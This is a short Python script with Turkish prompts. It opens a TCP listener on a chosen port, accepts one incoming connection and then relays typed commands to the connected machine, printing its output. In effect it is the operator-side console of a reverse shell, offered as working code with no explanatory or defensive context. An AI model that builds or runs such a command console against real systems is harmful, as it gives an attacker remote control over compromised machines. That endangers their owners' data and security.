import socket
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--port", type=int, required=True, help="Portu belirtin (örnek: 8080)")
args = parser.parse_args()
PORT = args.port

s = socket.socket()
try:
    s.bind(("0.0.0.0", PORT))
    s.listen(1)
    print(f"[✓] Dinleniyor: 0.0.0.0:{PORT}")
except Exception as e:
    print(f"[!] Port hatasi: {e}")
    exit()

try:
    client, addr = s.accept()
    print(f"[✓] Baglanti kuruldu: {addr}")
    print(client.recv(1024).decode())
except Exception as e:
    print(f"[!] Baglanti hatasi: {e}")
    exit()

while True:
    try:
        komut = input("Komut > ")
        client.send(komut.encode())
        if komut == "exit":
            break
        cevap = client.recv(4096).decode()
        print(cevap)
    except Exception as e:
        print(f"[!] Baglanti koptu: {e}")
        break
